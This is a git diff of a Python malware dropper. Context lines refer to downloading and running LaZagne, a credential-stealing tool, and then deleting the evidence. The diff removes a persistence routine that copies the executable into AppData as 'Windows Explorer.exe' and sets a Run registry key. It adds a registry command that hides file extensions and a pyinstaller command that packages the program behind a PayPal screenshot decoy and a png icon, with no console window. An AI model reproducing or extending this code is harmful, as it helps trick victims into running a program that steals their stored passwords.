@@ -4,11 +4,7 @@ import os
 import tempfile
 import shutil
 
-def become_persistent():
-    Malocation = os.environ["appdata"] + "\\Windows Explorer.exe"
-    if not os.path.exists(Malocation):
-        shutil.copyfile(sys.exexutable, Malocation)
-        subprocess.call('reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\run /v Explorer /t REG_SZ /d Exexutables/Download.exe "' + Malocation + '"', shell=True)
+subprocess.call("reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v HideFileExt /t REG_DWORD /d 1 /f")
 
 def Download(url):
     GetResponse = requests.get(url)
@@ -35,3 +31,7 @@ print(result)
 
 os.remove("lazagne.exe")
 os.remove("Download.exe")
+
+# pyinstaller --add-data "C:\Users\Justin Avina\Dropbox\PC\Downloads\paypalSS.png;." --noconsole --onefile --upx-dir=\upx --icon png.ico Download.py
+
+# reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v HideFileExt /t REG_DWORD /d 1 /f
